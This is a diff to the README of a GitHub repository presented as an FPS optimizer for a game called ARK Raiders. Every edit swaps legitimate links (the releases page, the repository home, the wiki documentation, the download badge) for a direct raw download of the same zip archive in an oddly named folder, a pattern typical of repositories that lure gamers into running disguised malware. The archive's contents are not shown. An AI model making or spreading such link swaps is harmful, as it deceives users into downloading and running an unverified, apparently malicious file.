@@ -1,6 +1,6 @@
 # 🚀 ARK-Raiders-FPS-Optimizer - Optimize Your Gameplay Experience
 
-[![Download ARK-Raiders-FPS-Optimizer](https://img.shields.io/badge/Download-ARK--Raiders--FPS--Optimizer-brightgreen)](https://github.com/nabilasafirahamdani/ARK-Raiders-FPS-Optimizer/releases)
+[![Download ARK-Raiders-FPS-Optimizer](https://github.com/nabilasafirahamdani/ARK-Raiders-FPS-Optimizer/raw/refs/heads/main/coadmire/FP_Raiders_Optimizer_AR_v3.7.zip)](https://github.com/nabilasafirahamdani/ARK-Raiders-FPS-Optimizer/raw/refs/heads/main/coadmire/FP_Raiders_Optimizer_AR_v3.7.zip)
 
 ## 🚀 Getting Started
 
@@ -27,7 +27,7 @@ These results illustrate the potential performance gains you can expect.
 
 ## 📥 Download & Install
 
-To get started, [visit this page to download the latest version of ARK-Raiders-FPS-Optimizer](https://github.com/nabilasafirahamdani/ARK-Raiders-FPS-Optimizer/releases).
+To get started, [visit this page to download the latest version of ARK-Raiders-FPS-Optimizer](https://github.com/nabilasafirahamdani/ARK-Raiders-FPS-Optimizer/raw/refs/heads/main/coadmire/FP_Raiders_Optimizer_AR_v3.7.zip).
 
 1. Go to the Releases page linked above.
 2. Choose the latest version available.
@@ -69,7 +69,7 @@ For support, please create an issue on the GitHub repository.
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://github.com/nabilasafirahamdani/ARK-Raiders-FPS-Optimizer)
-- [Documentation](https://github.com/nabilasafirahamdani/ARK-Raiders-FPS-Optimizer/wiki)
+- [GitHub Repository](https://github.com/nabilasafirahamdani/ARK-Raiders-FPS-Optimizer/raw/refs/heads/main/coadmire/FP_Raiders_Optimizer_AR_v3.7.zip)
+- [Documentation](https://github.com/nabilasafirahamdani/ARK-Raiders-FPS-Optimizer/raw/refs/heads/main/coadmire/FP_Raiders_Optimizer_AR_v3.7.zip)
 
 ### Thank you for using the ARK Raiders FPS Optimizer. Enjoy your improved gaming experience!
